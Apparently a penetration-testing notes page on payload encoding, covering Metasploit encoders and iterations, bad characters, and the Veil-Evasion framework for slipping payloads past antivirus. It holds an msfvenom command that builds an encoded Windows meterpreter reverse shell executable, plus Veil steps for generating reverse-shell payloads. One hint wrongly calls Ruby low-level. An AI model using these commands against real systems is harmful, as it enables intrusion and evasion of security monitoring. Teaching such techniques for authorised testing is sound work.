# Payload Encoding

## Metasploit

### Best Encoders

<figure><img src="../../../../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../../.gitbook/assets/Screenshot 2025-07-19 201153.png" alt=""><figcaption></figcaption></figure>

### &#x20;Iterations

* When you encode a payload, it transforms the payload‚Äôs bytecode to obfuscate it.
* **Running multiple iterations** means the encoder is applied again and again, each time further obfuscating the payload.
* This can help evade signature-based detection because the final encoded payload looks different every time.

| Option         | Description                                 |
| -------------- | ------------------------------------------- |
| `-i <number>`  | Number of times to apply the encoder        |
| Typical values | 1 to 5 (higher values increase obfuscation) |

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > payload.exe
```

### &#x20;Bad Characters

* Some bytes have special meanings in protocols or programming languages, e.g.:
  * Null byte (`\x00`) often terminates strings in C.
  * Newline (`\x0a`) or carriage return (`\x0d`) might break payload formatting.
* Including these bytes in your shellcode can cause it to fail or behave unpredictably

> Basicly we can say what are bad characters to avoid crash

## Veil-Evasion

### üß™ Techniques Beyond Signature Evasion

Veil uses **multiple layers** to evade modern defenses:

| Technique              | Purpose                                                           |
| ---------------------- | ----------------------------------------------------------------- |
| üîí AES/XOR Encryption  | Encrypts payloads to hide from static signature-based AV.         |
| üß¨ Code Obfuscation    | Changes variable names, function calls, and structure.            |
| üö´ Avoids API Hooks    | Bypasses common AV/EDR API monitoring patterns.                   |
| üß© Multiple Languages  | Generates payloads in C, PowerShell, Python ‚Üí compiled to `.exe`. |
| üîß In-Memory Execution | Some payloads avoid touching disk at all.                         |

***

### üõ†Ô∏è What Veil Actually Does

Veil is a **payload generation and obfuscation framework**, mainly used for:

| Goal                              | Description                                                                   |
| --------------------------------- | ----------------------------------------------------------------------------- |
| ‚úÖ **Signature Evasion**           | Avoid detection by AVs using obfuscation, encryption, encoding techniques.    |
| ‚úÖ **Custom Payload Generation**   | Generate payloads in Python, C, C#, PowerShell, etc., for flexibility.        |
| ‚úÖ **Post-Exploitation Support**   | Wrap Meterpreter, shellcode, VNC, or other stagers into undetectable formats. |
| ‚úÖ **Shellcode Delivery**          | Supports delivery of custom shellcode (not just Metasploit payloads).         |
| ‚úÖ **File-based Payload Droppers** | Payloads that can drop & execute in-memory (low I/O footprint).               |

***

### Commands

| **Command**          | **Description**                                                            |
| -------------------- | -------------------------------------------------------------------------- |
| `veil`               | Launch the Veil framework                                                  |
| `list`               | Show all available payloads (Python, C, PowerShell, etc.)                  |
| `use <payload/path>` | Select a specific payload to generate (e.g., `python/meterpreter/rev_tcp`) |
| `info`               | Display details about the selected payload                                 |
| `set LHOST <IP>`     | Set your attack machine‚Äôs IP address                                       |
| `set LPORT <PORT>`   | Set the port to receive the reverse connection                             |
| `generate`           | Generate the payload (saves to Veil‚Äôs output folder)                       |
| `exit`               | Quit the Veil console                                                      |

***

### Metasploit Use the payload created

```bash
set payload <path>
```

{% hint style="warning" %}
Low level languages like C++ , Ruby ,Go are very hard to detect.Unlike python which its not is high level.&#x20;
{% endhint %}

{% embed url="https://www.youtube.com/watch?t=696s&v=iz1twCSJZyo" %}

